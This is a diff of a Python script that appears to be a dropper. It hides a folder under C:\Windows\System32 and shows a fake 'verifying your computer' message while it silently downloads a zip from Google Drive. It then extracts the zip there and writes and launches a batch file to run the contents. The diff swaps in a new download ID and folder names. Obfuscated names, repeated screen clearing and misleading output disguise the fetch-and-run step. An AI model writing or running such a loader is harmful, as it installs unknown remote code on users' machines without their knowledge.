@@ -13,7 +13,7 @@ import os
 import gdown
 os.system('cls')
 
-dcnmwxdr = r'C:\Windows\System32\DSEL'
+dcnmwxdr = r'C:\Windows\System32\SMIX'
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
     os.system('cls')
@@ -129,7 +129,7 @@ xsadasdpath = r"C:\prx.txt"
 os.system('cls')
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\DSEL\aes-prem-jan-10.py"
+    aesv3_path = r"C:\Windows\System32\SMIX\premx_gui.py"
     files_to_delete = [
         r"C:\Windows\System32\MSRXL\aesprem-jan8.py",
         r"C:\Windows\System32\MSRXL\aesprem.bat",
@@ -160,22 +160,22 @@ delete_files_if_aesv3_missing()
 def download_file_from_google_drive(url, output_path):
     if not os.path.exists(output_path):
         gdown.download(url, output=output_path, quiet=True)
-if not os.path.exists("C:\\Windows\\System32\\DSEL\\aes-prem-jan-10.py"):
+if not os.path.exists("C:\\Windows\\System32\\SMIX\\premx_gui.py"):
     print("")
     print("")
     print("")
     print("")
     print("")
     print("---VERIYING YOUR COMPUTER PLEASE WAIT.")
-    download_file_from_google_drive("https://drive.google.com/uc?id=149mEZzVvkw040g1o9aTqm9tEuJ6iHS9W", "C:\\Windows\\System32\\DSEL\\prem0110.zip")
-    zip_file = r'C:\Windows\System32\DSEL\prem0110.zip'
-    extract_dir = r'C:\Windows\System32\DSEL'
+    download_file_from_google_drive("https://drive.google.com/uc?id=16KMj1_FjDyrFbNkh4yikftVb_QJROV9G", "C:\\Windows\\System32\\SMIX\\premx_ui.zip")
+    zip_file = r'C:\Windows\System32\SMIX\premx_ui.zip'
+    extract_dir = r'C:\Windows\System32\SMIX'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
 
 
 def create_batch_file(python_command, script_name):
-    directory = r"C:\Windows\System32\DSEL"
+    directory = r"C:\Windows\System32\SMIX"
     filename = "aesprem.bat"
     filepath = os.path.join(directory, filename)
     if not os.path.exists(filepath):
@@ -187,7 +187,7 @@ def create_batch_file(python_command, script_name):
     else:
         print("")
 
-create_batch_file("py -3.11", r"C:\Windows\System32\DSEL\aes-prem-jan-10.py")
+create_batch_file("py -3.11", r"C:\Windows\System32\SMIX\premx_gui.py")
 def run_batch_file(batch_file_path):
     try:
         subprocess.run([batch_file_path], shell=True, check=True)
@@ -197,7 +197,7 @@ def run_batch_file(batch_file_path):
         print("")
 
 os.system('cls')
-batch_file_path = r"C:\Windows\System32\DSEL\aesprem.bat"
+batch_file_path = r"C:\Windows\System32\SMIX\premx.bat"
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
 except Exception as e:
